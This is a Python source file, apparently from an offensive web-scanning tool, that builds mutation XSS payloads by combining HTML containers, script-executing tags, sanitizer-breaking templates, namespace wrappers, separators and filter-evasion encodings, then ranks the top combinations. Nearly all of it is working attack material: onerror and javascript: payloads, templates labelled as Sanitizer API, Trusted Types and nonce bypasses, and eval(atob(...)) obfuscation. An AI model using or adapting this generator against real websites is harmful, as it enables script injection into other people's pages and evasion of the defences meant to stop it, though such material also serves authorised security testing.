"""
payloads/mxss_engine_v2.py

╔══════════════════════════════════════════════════════════════╗
║   mXSS ENGINE v2 — 112,896,000 combinations (112.9M)        ║
║   45 containers × 28 exec × 32 break techniques              ║
║   × 14 separators × 10 namespaces × 20 encodings            ║
║   vs v1 (1,242,000): ×91× lebih banyak                       ║
║                                                              ║
║   NEW in v2:                                                 ║
║   + Shadow DOM declarative (template shadowrootmode)         ║
║   + Sanitizer API bypass (Chrome 124+)                       ║
║   + Trusted Types bypass patterns                            ║
║   + DOMParser re-parsing confusion                           ║
║   + Web Components custom elements                           ║
║   + SVG animate/set attribute attacks                        ║
║   + ARIA attribute injection                                 ║
║   + MathML extended namespace                                ║
║   + XML namespace switching                                  ║
║   + XHTML context confusion                                  ║
╚══════════════════════════════════════════════════════════════╝
"""

import heapq
import base64
import urllib.parse
import re
from typing import List, Tuple, Optional
from utils.logger import debug, info


class MXSSDimV2:

    # ── Containers (23 → 45, +22 new) ─────────────────────────
    CONTAINERS = [
        # Original 23
        ("listing",    1.00),
        ("noscript",   0.98),
        ("xmp",        0.96),
        ("textarea",   0.95),
        ("title",      0.94),
        ("style",      0.92),
        ("iframe",     0.90),
        ("plaintext",  0.88),
        ("noframes",   0.85),
        ("template",   0.83),
        ("math",       0.82),
        ("svg",        0.80),
        ("select",     0.78),
        ("option",     0.75),
        ("table",      0.73),
        ("form",       0.70),
        ("script",     0.68),
        ("object",     0.65),
        ("embed",      0.63),
        ("applet",     0.55),
        ("frameset",   0.52),
        ("xml",        0.50),
        ("comment",    0.48),
        # NEW v2: Modern containers
        ("dialog",          0.93),  # HTML5 dialog (widely supported 2023+)
        ("details",         0.91),  # details/summary
        ("canvas",          0.80),  # canvas event handlers
        ("slot",            0.87),  # Shadow DOM slot
        ("portal",          0.85),  # Chrome portal experiment
        ("picture",         0.82),  # picture/source
        ("track",           0.79),  # track with onerror
        ("video",           0.88),  # video with multiple events
        ("audio",           0.86),  # audio events
        ("input",           0.84),  # input autofocus/onfocus
        ("button",          0.83),  # button events
        ("datalist",        0.72),  # datalist element
        ("output",          0.70),  # output element
        ("fieldset",        0.69),  # fieldset events
        ("meter",           0.67),  # meter events
        ("progress",        0.65),  # progress events
        ("marquee",         0.77),  # marquee onstart
        ("body",            0.92),  # body with onload/onerror
        ("head",            0.60),  # head injection
        ("html",            0.58),  # root html element
        ("annotation",      0.55),  # MathML annotation
        ("desc",            0.53),  # SVG desc element
        ("foreignobject",   0.88),  # SVG foreignObject (critical!)
    ]

    # ── Exec Payloads (15 → 28, +13 new) ──────────────────────
    EXEC_PAYLOADS = [
        # Original 15
        ("<img src=x onerror=alert(1)>",           1.00),
        ("<svg onload=alert(1)>",                   0.98),
        ("<script>alert(1)</script>",               0.96),
        ("<iframe onload=alert(1)>",                0.94),
        ("<body onload=alert(1)>",                  0.92),
        ("<input autofocus onfocus=alert(1)>",      0.90),
        ("<details open ontoggle=alert(1)>",        0.88),
        ("<video src=x onerror=alert(1)>",          0.86),
        ("<audio src=x onerror=alert(1)>",          0.84),
        ("<svg><animate onbegin=alert(1)>",         0.82),
        ("<marquee onstart=alert(1)>x</marquee>",   0.80),
        ("<isindex type=image src=1 onerror=alert(1)>", 0.75),
        ("<object data=javascript:alert(1)>",       0.72),
        ("<math href=javascript:alert(1)>x</math>", 0.70),
        ("<img src=1 onerror=alert`1`>",            0.68),
        # NEW v2
        ("<svg><set attributeName=onmouseover to=alert(1)>",  0.93),  # SVG set attack
        ("<svg><animate attributeName=href values=javascript:alert(1)>", 0.91),  # SVG animate
        ("<dialog open onclose=alert(1)>x<form method=dialog><button>x</button></form></dialog>", 0.89),
        ("<details open ontoggle=alert(1)><summary>x</summary></details>", 0.95),
        ("<input type=image src=x onerror=alert(1)>",  0.88),  # input[type=image]
        ("<button form=x formaction=javascript:alert(1)>x</button>", 0.85),  # form hijack
        ("<object type=text/html data=javascript:alert(1)>", 0.82),
        ("<embed type=text/html src=javascript:alert(1)>", 0.80),
        ("<link rel=stylesheet href=javascript:alert(1)>", 0.75),
        ("<table background=javascript:alert(1)>",  0.72),  # old IE trick
        ("<base href=javascript:alert(1)><!--",     0.70),  # base href
        ("<meta http-equiv=refresh content=0;url=javascript:alert(1)>", 0.78),
        ("<form action=javascript:alert(1)><input type=submit>", 0.85),
    ]

    # ── Break Techniques (15 → 32, +17 new) ───────────────────
    BREAK_TECHNIQUES = [
        # Original 15
        ("closing_tag",     '<{C}><img src="</{C}>{P}">',                     1.00),
        ("title_attr",      '<{C} title="</{C}>{P}">x</{C}>',                0.96),
        ("href_attr",       '<{C} href="</{C}>{P}">x</{C}>',                 0.94),
        ("cdata_break",     '<{C}><![CDATA[</{C}>{P}]]></{C}>',              0.90),
        ("comment_break",   '<{C}><!--</{C}>{P}--></{C}>',                   0.88),
        ("malformed_attr",  '<{C} class="x\'></{C}>{P}<{C} y="',            0.85),
        ("namespace",       '<svg><{C}><img src="</{C}></{C}>{P}"></svg>',   0.82),
        ("math_mtext",      '<math><mtext><{C}><img src="</{C}>{P}">',       0.80),
        ("table_foster",    '<table><{C}><img src="</{C}>{P}"></table>',     0.78),
        ("template_break",  '<template><{C}></template>{P}',                0.75),
        ("nested_script",   '<scr<{C}>ipt>{P}</scr</{C}>ipt>',              0.72),
        ("ie_conditional",  '<!--[if lt IE 9]><{C}><![endif]-->{P}',        0.70),
        ("double_nest",     '<{C}><{C}></{C}>{P}</{C}>',                    0.68),
        ("src_attr",        '<{C} src="</{C}>{P}">',                        0.65),
        ("action_attr",     '<{C} action="</{C}>{P}">',                     0.62),
        # NEW v2: Modern break techniques
        ("shadow_root",     '<{C}><template shadowrootmode=open>{P}</template></{C}>',  0.95),
        ("shadow_closed",   '<{C}><template shadowrootmode=closed>{P}</template></{C}>', 0.92),
        ("slot_injection",  '<{C} slot=x>{P}</{C}>',                        0.90),
        ("foreign_obj",     '<svg><foreignObject width=100% height=100%><{C}>{P}</{C}></foreignObject></svg>', 0.93),
        ("sanitizer_bypass","<div id=x>{P}</div><script>new Sanitizer().sanitizeFor('div',document.getElementById('x').innerHTML)</script>", 0.85),
        ("dom_parser",      '<{C}>{P}</{C}><script>new DOMParser().parseFromString(document.body.innerHTML,"text/html")</script>', 0.82),
        ("trusted_types",   '<script>trustedTypes.createPolicy("default",{{createHTML:s=>s}}).createHTML("{P}")</script>', 0.80),
        ("mutation_observer",'<{C}>{P}</{C}><script>new MutationObserver(m=>eval(m[0].addedNodes[0].textContent)).observe(document.body,{{childList:true}})</script>', 0.78),
        ("inner_html_sink", '<div id=mxss style=display:none><{C}>{P}</{C}></div><script>document.body.innerHTML+=document.getElementById("mxss").innerHTML</script>', 0.75),
        ("set_attribute",   '<{C}></{C}><script>document.querySelector("{C}").setAttribute("onload","{P}")</script>',  0.73),
        ("custom_element",  '<x-{C}><template>{P}</template></x-{C}><script>customElements.define("x-{C}",class extends HTMLElement{{connectedCallback(){{this.innerHTML=this.querySelector("template").innerHTML}}}})</script>', 0.70),
        ("svg_animate_set", '<svg><{C}><set attributeName=onload to="{P}"></{C}></svg>',  0.88),
        ("svg_use_href",    '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><{C} {P}/></svg>#x"/></svg>', 0.75),
        ("xhtml_doc",       '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><{C}>{P}</{C}></html>', 0.65),
        ("innerHTML_outer", '<{C} id=x>{P}</{C}><script>var el=document.getElementById("x");document.body.innerHTML=el.outerHTML</script>', 0.72),
        ("innerhtml_write", '<{C}>{P}</{C}><script>document.write(document.body.innerHTML)</script>',  0.68),
        ("nonce_bypass",    '<{C} nonce=NONCE>{P}</{C}>',                   0.78),
    ]

    # ── Separators (6 → 14, +8 new) ───────────────────────────
    SEPARATORS = [
        ("none",       "",        1.00),
        ("space",      " ",       0.90),
        ("tab",        "\t",      0.85),
        ("newline",    "\n",      0.83),
        ("null",       "\x00",    0.70),
        ("crlf",       "\r\n",    0.75),
        # NEW v2
        ("vtab",       "\x0b",    0.72),
        ("formfeed",   "\x0c",    0.68),
        ("nbsp",       "\xa0",    0.80),
        ("zwspace",    "\u200b",  0.76),
        ("softhyphen", "\u00ad",  0.74),
        ("unicode_nl", "\u2028",  0.65),  # Unicode line separator
        ("unicode_ps", "\u2029",  0.63),  # Unicode paragraph separator
        ("bom",        "\ufeff",  0.60),  # Byte order mark
    ]

    # ── Namespaces (4 → 10, +6 new) ───────────────────────────
    NAMESPACES = [
        ("none",        "",                                                       1.00),
        ("svg_wrap",    "<svg>{CONTENT}</svg>",                                   0.85),
        ("math_wrap",   "<math><mtext>{CONTENT}</mtext></math>",                  0.80),
        ("foreign",     "<svg><foreignObject>{CONTENT}</foreignObject></svg>",    0.78),
        # NEW v2
        ("xhtml",       "<html xmlns='http://www.w3.org/1999/xhtml'>{CONTENT}</html>", 0.72),
        ("mathml_full", "<math xmlns='http://www.w3.org/1998/Math/MathML'><annotation-xml encoding='text/html'>{CONTENT}</annotation-xml></math>", 0.82),
        ("svg_script",  "<svg xmlns='http://www.w3.org/2000/svg'><script>{CONTENT}</script></svg>", 0.88),
        ("shadow_wrap", "<div><template shadowrootmode=open>{CONTENT}</template></div>", 0.90),
        ("xml_ns",      "<?xml version='1.0'?><root xmlns:xlink='http://www.w3.org/1999/xlink'>{CONTENT}</root>", 0.65),
        ("iframe_srcdoc", "<iframe srcdoc='{CONTENT}'>",                         0.88),
    ]

    # ── Encodings (10 → 20, +10 new) ──────────────────────────
    ENCODINGS = [
        ("none",         1.00, lambda p: p),
        ("html_entity",  0.90, lambda p: "".join(f"&#{ord(c)};" for c in p)),
        ("html_hex",     0.88, lambda p: "".join(f"&#x{ord(c):x};" for c in p)),
        ("url_encode",   0.85, lambda p: urllib.parse.quote(p, safe="")),
        ("double_url",   0.80, lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")),
        ("unicode",      0.75, lambda p: "".join(f"\\u{ord(c):04x}" for c in p)),
        ("js_hex",       0.70, lambda p: "".join(f"\\x{ord(c):02x}" for c in p)),
        ("base64_eval",  0.65, lambda p: f"eval(atob('{base64.b64encode(p.encode()).decode()}'))"),
        ("fromcharcode", 0.60, lambda p: f"eval(String.fromCharCode({','.join(str(ord(c)) for c in p)}))"),
        ("mixed_case",   0.78, lambda p: "".join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p))),
        # NEW v2
        ("null_insert",  0.72, lambda p: p.replace("script", "scr\x00ipt").replace("alert", "ale\x00rt")),
        ("comment_mid",  0.75, lambda p: re.sub(r'(script|onerror|onload|alert)', lambda m: m.group(0)[:len(m.group(0))//2]+"<!---->"+m.group(0)[len(m.group(0))//2:], p, count=1, flags=re.IGNORECASE)),
        ("tab_in_event", 0.73, lambda p: p.replace("onerror=", "onerror\t=\t").replace("onload=", "onload\t=\t")),
        ("soft_hyphen",  0.70, lambda p: p.replace("script", "scr\u00adipt").replace("alert", "ale\u00adrt")),
        ("zwsp_insert",  0.68, lambda p: p.replace("script", "s\u200bcript").replace("alert", "a\u200blert")),
        ("octal",        0.55, lambda p: "".join(f"\\{ord(c):o}" for c in p)),
        ("decimal_ent",  0.82, lambda p: "".join(f"&#{ord(c)};" for c in p)),
        ("json_unicode", 0.78, lambda p: "".join(f"\\u{ord(c):04x}" if c in '<>"' else c for c in p)),
        ("css_unicode",  0.65, lambda p: "".join(f"\\{ord(c):x} " if c.isalpha() else c for c in p)),
        ("overlong",     0.45, lambda p: p.replace("<", "\xc0\xbc").replace(">", "\xc0\xbe")),
    ]

    @classmethod
    def total(cls) -> int:
        return (len(cls.CONTAINERS) * len(cls.EXEC_PAYLOADS) *
                len(cls.BREAK_TECHNIQUES) * len(cls.ENCODINGS) *
                len(cls.SEPARATORS) * len(cls.NAMESPACES))


class MXSSEngineV2:
    """
    v2 mXSS engine: 112,896,000 combinations.
    45 × 28 × 32 × 20 × 14 × 10 = 112,896,000
    """

    def generate(self, top_n: int = 200) -> List[Tuple[str, float, str]]:
        heap  = []
        count = 0

        top_c   = MXSSDimV2.CONTAINERS[:min(15, len(MXSSDimV2.CONTAINERS))]
        top_ex  = MXSSDimV2.EXEC_PAYLOADS[:min(12, len(MXSSDimV2.EXEC_PAYLOADS))]
        top_t   = MXSSDimV2.BREAK_TECHNIQUES[:min(15, len(MXSSDimV2.BREAK_TECHNIQUES))]
        top_enc = MXSSDimV2.ENCODINGS[:min(10, len(MXSSDimV2.ENCODINGS))]
        top_sep = MXSSDimV2.SEPARATORS[:min(6, len(MXSSDimV2.SEPARATORS))]
        top_ns  = MXSSDimV2.NAMESPACES[:min(6, len(MXSSDimV2.NAMESPACES))]

        for ctag, c_score in top_c:
            for exec_p, ep_score in top_ex:
                for tech_label, template, t_score in top_t:
                    for enc_label, enc_score, enc_fn in top_enc:
                        for sep_label, sep_str, sep_score in top_sep:
                            for ns_label, ns_tmpl, ns_score in top_ns:

                                score = (c_score * ep_score * t_score *
                                         enc_score * sep_score * ns_score) ** (1/6)

                                try:
                                    encoded = enc_fn(exec_p)
                                    payload = (template
                                               .replace("{C}", ctag)
                                               .replace("{P}", sep_str + encoded)
                                               .replace("{A}", ""))
                                    if ns_tmpl:
                                        payload = ns_tmpl.replace("{CONTENT}", payload)
                                except Exception:
                                    continue

                                count += 1
                                label = f"mxssv2:{ctag}:{tech_label}:{enc_label}"

                                if len(heap) < top_n:
                                    heapq.heappush(heap, (score, count, payload, label))
                                elif score > heap[0][0]:
                                    heapq.heapreplace(heap, (score, count, payload, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"mXSSv2: {count:,}/{self.total:,} → top {len(result)}")
        return [(p, s, l) for s, _, p, l in result]

    @property
    def total(self) -> int:
        return MXSSDimV2.total()
